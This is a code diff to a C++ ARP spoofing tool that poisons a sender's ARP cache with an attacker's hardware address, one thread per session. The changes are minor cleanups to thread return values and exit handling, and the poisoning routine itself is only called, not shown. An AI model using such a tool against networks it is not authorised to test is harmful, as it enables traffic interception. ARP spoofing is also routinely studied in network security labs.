@@ -40,14 +40,14 @@ void *ARPSpoofing(void *)
     if((handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf))==NULL)
     {
         LOG(FATAL) << "pcap_open_live : failed";
-        return (void *)-1;
+        return NULL;
     }
 
     LOG(INFO) << "getHWaddrbyIPaddr(sender)";
     if(!getHWaddrByIPaddr(&sha, handle, attacker_ha, attacker_ip, sip))
     {
         LOG(FATAL) << "getHWaddrbyIPaddr : failed";
-        return (void *)-1;
+        return NULL;
     }
 /*
     LOG(INFO) << "getHWaddrbyIPaddr(target)";
@@ -57,11 +57,10 @@ void *ARPSpoofing(void *)
         return (void *)-1;
     }
 */
-
     if(!ARPCachePoisoning(handle, sha, sip, attacker_ha, tip))
     {
         LOG(FATAL) << "ARPCachePoisoning : failed";
-        return (void *)-1;
+        return NULL;
     }
 
     while(isSpoofing)
@@ -69,14 +68,13 @@ void *ARPSpoofing(void *)
         
     }
 
-    return NULL;
+    pthread_exit(NULL);
 }
 
 int main(int argc, char **argv)
 {
     int         session_num;
     pthread_t   threads[MAX_SESSION_NUM];
-    int         res;
     int         i;
 
     google::InitGoogleLogging(argv[0]);
@@ -112,21 +110,10 @@ int main(int argc, char **argv)
         pthread_create(&threads[i], NULL, ARPSpoofing, NULL);
     }
 
-    printf("Press any button to exit\n");
+    printf("Press any button to stop ARP spoofing\n");
     getchar();
 
     isSpoofing = false;
-
-    for(i=0;i<session_num;i++)
-    {
-        pthread_join(threads[i], (void **)&res);
-        if(res != 0)
-        {
-            LOG(FATAL) << "pthread_join : failed";
-            return -1;
-        }
-        LOG(INFO) << "threads[" << i << "] : finished";
-    }
 
     return 0;
 }
